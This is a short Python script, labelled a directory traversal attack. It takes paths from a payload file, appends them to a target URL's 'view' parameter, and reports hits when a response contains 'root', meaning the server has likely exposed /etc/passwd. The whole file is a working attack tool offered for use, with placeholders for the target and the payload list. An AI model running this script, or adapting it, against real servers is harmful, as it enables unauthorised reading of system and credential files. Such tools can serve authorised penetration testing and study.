#!/usr/bin/python3
# Description:  A simple script that executes a directory traversal attack. Change the URL and payload path to whatever you want.                  
# Usage: directory_traversal_attack.py
import sys
import requests

def main():
    payload = '/path/to/payload.txt'                                                    #CHANGE THIS
    URL = 'http://example.com/test.php?view=/var/www/html/development_testing/'         #CHANGE THIS
    with open(payload) as file:
        for index, line in enumerate(file):
            
            dir = line.strip()
            final_URL = "".join((URL,dir))
            response = requests.get(final_URL)

            if response.status_code == 200:
                result = response.text

                if "root" in result:                                    #CHANGE THIS if you want to find something else other than the /etc/passwd file
                    print("[!] Path Traversal found: ", final_URL)

    print("** Directory Traversal attack finished **")
            

if __name__ == "__main__":
    try:
        print("** Directory Traversal attack started **")
        main()
    except KeyboardInterrupt:
        print("\n** Detected CTRL+C -> Quitting **")
        sys.exit(0)